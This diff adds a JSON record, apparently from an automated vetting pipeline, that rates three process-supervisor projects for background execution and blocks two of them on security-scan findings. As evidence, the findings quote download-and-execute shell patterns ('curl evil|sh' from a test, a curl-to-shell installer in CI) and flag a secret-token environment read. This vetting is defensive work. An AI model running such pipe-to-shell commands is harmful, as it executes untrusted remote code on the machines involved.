@@ -1,0 +1,66 @@
+{
+  "schema_version": 1,
+  "capability_id": "platform.background_execution",
+  "observed_at": "2026-09-15",
+  "alternatives": [
+    {
+      "id": "Supervisor/supervisor",
+      "source_version": "4.3.0",
+      "commit_sha": "dbca8d457e61d8707c40f99c78330b87939483a3",
+      "state": "REVIEW",
+      "counted": false,
+      "reason": "Useful Unix supervisor but not counted: Pi mechanism evidence is weaker than the counted systemd families and dependency analysis was unavailable.",
+      "security": {
+        "source_verdict": "REVIEW",
+        "finding_count": 6,
+        "key_findings": [
+          {"rule_id": "source_blob_unreadable", "severity": "HIGH", "path": "supervisor/medusa/docs/composing_producers.gif", "evidence": "UnicodeDecodeError"},
+          {"rule_id": "process_execution", "severity": "HIGH", "path": "supervisor/process.py", "evidence": "subprocess."}
+        ],
+        "supply_chain_verdict": "NOT_ANALYZED",
+        "vulnerability_verdict": "NOT_ANALYZED",
+        "database_checked": false
+      }
+    },
+    {
+      "id": "runwisp/runwisp",
+      "source_version": "snapshot-2026-09-14",
+      "commit_sha": "112f226e63273fd5c0e90959cda42aba80299c37",
+      "state": "BLOCKED",
+      "counted": false,
+      "reason": "Not counted: file-budget limit plus shell-download-execute patterns in pinned tests.",
+      "security": {
+        "source_verdict": "BLOCK",
+        "finding_count": 10,
+        "key_findings": [
+          {"rule_id": "scan_file_budget_exceeded", "severity": "HIGH", "path": "apps/ui/e2e/fixtures/runwisp.d/imported.toml", "evidence": "more than 800 relevant files"},
+          {"rule_id": "secret_environment_access", "severity": "REVIEW", "path": "apps/runwisp/cmd/runwisp/cmd_cloud.go", "evidence": "environment key resembles a secret: RUNWISP_CLOUD_TOKEN"},
+          {"rule_id": "shell_download_execute", "severity": "CRITICAL", "path": "apps/runwisp/internal/autostart/templates_test.go", "evidence": "curl evil|sh"}
+        ],
+        "supply_chain_verdict": "REVIEW",
+        "vulnerability_verdict": "NOT_ANALYZED",
+        "database_checked": false
+      }
+    },
+    {
+      "id": "chipsenkbeil/service-manager-rs",
+      "source_version": "0.11.0",
+      "commit_sha": "c5464bbd5d9f9b586d49581140ada7e3e9f01c61",
+      "state": "BLOCKED",
+      "counted": false,
+      "reason": "Not counted: pinned CI contains a curl-to-shell installer pattern.",
+      "security": {
+        "source_verdict": "BLOCK",
+        "finding_count": 1,
+        "key_findings": [
+          {"rule_id": "shell_download_execute", "severity": "CRITICAL", "path": ".github/workflows/ci.yml", "evidence": "curl https://sh.rustup.rs -sSf | sh"}
+        ],
+        "supply_chain_verdict": "CLEAR",
+        "vulnerability_verdict": "NOT_ANALYZED",
+        "database_checked": false
+      }
+    }
+  ],
+  "certification_asserted": false,
+  "library_write_attempted": false
+}
